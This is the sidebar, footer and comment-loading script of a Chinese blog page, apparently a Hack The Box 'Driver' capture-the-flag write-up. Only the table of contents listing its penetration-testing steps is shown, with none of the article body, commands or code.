class="length-num">21</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Iconabc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Iconabc/" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="mailto:2899345299@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">up up</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Driver"><span class="toc-number">1.</span> <span class="toc-text">HTB-Driver:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%BA%E5%99%A8%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">机器简介：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">渗透过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E4%BE%A6%E5%AF%9F%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">初始侦察：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">nmap端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">nmap详细信息扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap-udp%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">nmap udp扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">nmap漏洞脚本扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web80%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">web80端口渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.1.6.</span> <span class="toc-text">攻击面分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#smb%E5%85%B1%E4%BA%ABscf%E2%BD%82%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.1.7.</span> <span class="toc-text">smb共享scf⽂件攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%EF%BC%9A"><span class="toc-number">1.2.1.7.1.</span> <span class="toc-text">扩展：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3NTLMv2%E5%93%88%E5%B8%8C"><span class="toc-number">1.2.1.8.</span> <span class="toc-text">破解NTLMv2哈希</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E7%B3%BB%E7%BB%9F%E7%AB%8B%E8%B6%B3%E7%82%B9%EF%BC%9Atony%E7%9A%84shell"><span class="toc-number">1.2.1.9.</span> <span class="toc-text">建立系统立足点：tony的shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.1.10.</span> <span class="toc-text">提权枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%EF%BC%9A"><span class="toc-number">1.2.1.10.1.</span> <span class="toc-text">查询相关资料：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.2.1.11.</span> <span class="toc-text">持久化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/cc605c90.html" title="03-C/C++软件逆向技术">03-C/C++软件逆向技术</a><time datetime="2025-01-09T13:52:21.000Z" title="发表于 2025-01-09 21:52:21">2025-01-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/be4abe2b.html" title="02-x86_64架构汇编语言">02-x86_64架构汇编语言</a><time datetime="2024-12-26T08:44:51.000Z" title="发表于 2024-12-26 16:44:51">2024-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/e11d0610.html" title="01-C++基础学习">01-C++基础学习</a><time datetime="2024-12-22T01:59:42.000Z" title="发表于 2024-12-22 09:59:42">2024-12-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ad068c24.html" title="多级代理工具">多级代理工具</a><time datetime="2024-12-18T12:33:28.000Z" title="发表于 2024-12-18 20:33:28">2024-12-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/868e8d19.html" title="网络通信知识点小总">网络通信知识点小总</a><time datetime="2024-12-17T07:23:58.000Z" title="发表于 2024-12-17 15:23:58">2024-12-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/shuai.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By icon</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="/">icon</a> is striving to become stronger!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo

  const disqusReset = conf => {
    window.DISQUS && window.DISQUS.reset({
      reload: true,
      config: conf
    })
  }

  const loadDisqus = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyDisqus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    window.disqus_identifier = isShuoshuo ? path : '/posts/23837ad8.html'
    window.disqus_url = isShuoshuo ? location.origin + path : 'https://iconabc.github.io/posts/23837ad8.html'

    const disqus_config = function () {
      this.page.url = disqus_url
      this.page.identifier = disqus_identifier
      this.page.title = 'HTB-Driver'
    }

    if (window.DISQUS) disqusReset(disqus_config)
    else {
      const script = document.createElement('script')
      script.src = 'https://.disqus.com/embed.js'
      script.setAttribute('data-timestamp', +new Date())
      document.head.appendChild(script)
    }

    btf.addGlobalFn('themeChange', () => disqusReset(disqus_config), 'disqus')
  }

  const getCount = async() => {
    try {
      const eleGroup = document.querySelector('#post-meta .disqus-comment-count')
      if (!eleGroup) return
      const cleanedLinks = eleGroup.href.replace(/#post-comment$/, '')

      const res = await fetch(`https://disqus.com/api/3.0/threads/set.json?forum=&api_key=&thread:link=${cleanedLinks}`,{
        method: 'GET'
      })
      const result = await res.json()

      const count = result.response.length ? result.response[0].posts : 0
      eleGroup.textContent = count
    } catch (err) {
      console.error(err)
    }
  }

  if (isShuoshuo) {
    'Disqus' === 'Disqus'
      ? window.shuoshuoComment = { loadComment: loadDisqus }
      : window.loadOtherComment = loadDisqus
    return
  }

  if ('Disqus' === 'Disqus' || !false) {
    if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
    else {
      loadDisqus()
      
    }
  } else {
    window.loadOtherComment = loadDisqus
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>